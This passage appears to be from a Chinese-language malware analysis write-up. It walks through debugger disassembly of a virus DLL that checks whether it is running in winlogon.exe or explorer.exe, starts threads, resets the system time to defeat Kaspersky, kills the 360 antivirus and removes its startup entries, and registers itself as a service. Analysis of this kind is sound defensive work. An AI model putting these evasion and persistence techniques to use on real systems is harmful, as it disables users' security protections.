
```
100029E0  .  53         push    ebx                             ; |pSecurity => NULL  
100029E1  .  FFD7      call    edi                             ; \CreateThread  
100029E3  .  8D45 FC   lea     eax, dword ptr [ebp-4]  
100029E6  .  50        push    eax                             ; /pThreadId  
100029E7  .  53        push    ebx                             ; |CreationFlags => 0  
100029E8  .  53        push    ebx                             ; |pThreadParm => NULL  
100029E9  .  68 4B200010  push    1000204B                    ; |ThreadFunction = 555E9A24.1000204B  
100029EE  .  53        push    ebx                             ; |StackSize => 0  
100029EF  .  53        push    ebx                             ; |pSecurity => NULL  
100029F0  .  FFD7      call    edi                             ; \CreateThread  
100029F2  .  68 046A0010  push    10006A04                    ; /Arg2 = 10006A04 ASCII "explorer.exe"  
100029F7  .  68 04670010  push    10006704                    ; |Arg1 = 10006704 ASCII "555E9A24.DLL"  
100029FC  .  E8 38F7FFFF  call    10002139                    ; \555E9A24.10002139  
10002A01  >  68 E8030000  /push   3E8  
10002A06  .  FFD6      |call    esi  
10002A08  .^ EB F7     \jmp     short 10002A01  
10002A0A  >  68 046A0010  push    10006A04                    ;  ASCII "explorer.exe"  
10002A0F  .  FFD7      call    edi  
10002A11  .  50        push    eax  
10002A12  .  8D85 24FDFFFF  lea     eax, dword ptr [ebp-2DC]  
10002A18  .  50        push    eax  
10002A19  .  FFD7      call    edi  
10002A1B  .  50        push    eax                             ; |s1  
10002A1C  .  E8 91190000  call    <jmp.&MSVCRT.strstr>         ; \strstr  
10002A21  .  59        pop     ecx                             ;  检测当前进程是不是 explorer.exe  
10002A22  .  85C0      test    eax, eax  
10002A24  .  59        pop     ecx  
10002A25  .  74 28     je      short 10002A4F                  ;  如果不是,跳走  
10002A27  .  8B3D B4500010  mov     edi, dword ptr [<&KERNEL32.CreateThre>;  kernel32.CreateThread  
10002A2D  .  8D45 FC   lea     eax, dword ptr [ebp-4]  
10002A30  .  33DB      xor     ebx, ebx  
10002A32  .  50        push    eax                             ; /pThreadId  
10002A33  .  53        push    ebx                             ; |CreationFlags => 0  
10002A34  .  53        push    ebx                             ; |pThreadParm => NULL  
10002A35  .  68 221F0010  push    10001F22                    ; |ThreadFunction = 555E9A24.10001F22  
10002A3A  .  53        push    ebx                             ; |StackSize => 0  
10002A3B  .  53        push    ebx                             ; |pSecurity => NULL  
10002A3C  .  FFD7      call    edi                             ; \CreateThread  
10002A3E  .  8D45 FC   lea     eax, dword ptr [ebp-4]  
10002A41  .  50        push    eax                             ; /pThreadId  
10002A42  .  53        push    ebx                             ; |CreationFlags => 0  
10002A43  .  53        push    ebx                             ; |pThreadParm => NULL  
10002A44  .  68 61250010  push    10002561                    ; |ThreadFunction = 555E9A24.10002561  
10002A49  .  53        push    ebx                             ; |StackSize => 0  
10002A4A  .  53        push    ebx                             ; |pSecurity => NULL  
10002A4B  .  FFD7      call    edi                             ; \CreateThread  
10002A4D  .^ EB B2     jmp     short 10002A01  
10002A4F  >  53        push    ebx  
```

上面的代码比较长，但是大体上是分支语句

```
if (CurrentProcess == "WINLOGON.EXE")
  do A;
elseif (CurrentProcess == "EXPLORER.EXE")
  do B;
else
  do C;
```

懂了吧，呵呵

下面如果当前进程是 `winlogon.exe` 的话，看看病毒如何破坏（执行到 `1000299D` 时，在 `1000299F` 右键，此处为 `EIP`，呵呵，这个方法贼好使，当然你的保证堆栈等东西的平衡）

创建了几个线程，我们一个一个地分析功能，`CTRL+G`，输入 `10001000`，来到（继续我的伎俩，此处为新 `EIP`，哈哈）

```
10001000   .  55         push    ebp  
10001001   .  8BEC      mov     ebp, esp  
10001003   .  83EC 10   sub     esp, 10  
10001006   >  8D45 F0   lea     eax, dword ptr [ebp-10]  
10001009   .  50        push    eax                             ; /pSystemTime  
1000100A   .  FF15 94500010  call    dword ptr [<&KERNEL32.GetSystemTime>] ; \GetSystemTime  
10001010   .  66:817D F0 D5>cmp     word ptr [ebp-10], 7D5  
10001016   .  76 0A     jbe     short 10001022  
10001018   .  8D45 F0   lea     eax, dword ptr [ebp-10]  
1000101B   .  50        push    eax                             ; /pSystemTime  
1000101C   .  FF15 90500010  call    dword ptr [<&KERNEL32.SetSystemTime>] ; \SetSystemTime    ///又是修改系统时间,来使得卡巴斯基无效  
10001022   >  68 D0070000  push    7D0                          ; /Timeout = 2000. ms  
10001027   .  FF15 8C500010  call    dword ptr [<&KERNEL32.Sleep>]         ; \Sleep  
1000102D   .^\\EB D7     jmp     short 10001006  
```

上面是一个带有 `sleep` 的死循环，不停的修改系统时间，也就是说，这个线程是对付卡巴斯基的。

下一个线程，`CTRL+G`，`10003815` 来到

```
10003815   > /E8 BBFEFFFF  call    100036D5        ////杀除 360，并删除 360 的启动项  
1000381A   . |68 E8030000  push    3E8                             ; /Timeout = 1000. ms  
1000381F   . |FF15 8C500010  call    dword ptr [<&KERNEL32.Sleep>]         ; \Sleep  
10003825   .^\\EB EE     jmp     short 10003815  
```

又是一个带有 `sleep` 的死循环，进 `call`

```
100036D5  /$  55        push    ebp  
100036D6  |.  8BEC      mov     ebp, esp  
100036D8  |.  B8 7C1E0000  mov     eax, 1E7C  
100036DD  |.  E8 EE0C0000  call    100043D0                   ;  没有有用的东西  
```

往下走，经过一些和注册表相关字符串，来到一个循环

```
1000376F  |> /8D5F E7     /lea      ebx, dword ptr [edi-19]                ;  "360"  
10003772  |. |53         |push     ebx                           ; /s  
10003773  |. |E8 460C0000  |call     <jmp.&MSVCRT.strlen>                 ; \strlen  
10003778  |. |83F8 03     |cmp      eax, 3  
1000377B  |. |59         |pop      ecx  
1000377C  |. |72 07      |jb       short 10003785                   ;  字符串长度小于 3,跳走  
1000377E  |. |53         |push     ebx                           ;  "360"  
1000377F  |. |E8 50010000  |call     100038D4                   ;  杀死 360 的函数////在下面，会详细一下  
10003784  |. |59         |pop      ecx  
10003785  |> |6A 05      |push     5  
10003787  |. |FFD6      |call     esi  
10003789  |. |57         |push     edi                           ; /s  
1000378A  |. |E8 2F0C0000  |call     <jmp.&MSVCRT.strlen>                 ; \strlen  
1000378F  |. |83F8 03     |cmp      eax, 3  
10003792  |. |59         |pop      ecx  
10003793  |. |72 34      |jb       short 100037C9  
10003795  |. |8D85 34FFFFFF  |lea      eax, dword ptr [ebp-CC]  
1000379B  |. |50         |push     eax                           ; /src  
1000379C  |. |8D85 D0FEFFFF  |lea      eax, dword ptr [ebp-130]            ; |  
100037A2  |. |50         |push     eax                           ; |dest  
100037A3  |. |E8 FE0B0000  |call     <jmp.&MSVCRT.strcpy>                 ; \strcpy  
100037A8  |. |8D85 D0FEFFFF  |lea      eax, dword ptr [ebp-130]  
100037AE  |. |57         |push     edi                           ; /src  
100037AF  |. |50         |push     eax                           ; |dest  
100037B0  |. |E8 F70B0000  |call     <jmp.&MSVCRT.strcat>                 ; \strcat  
100037B5  |. |57         |push     edi  
100037B6  |. |E8 9B070000  |call     10003F56                   ;  注册自身服务  
```
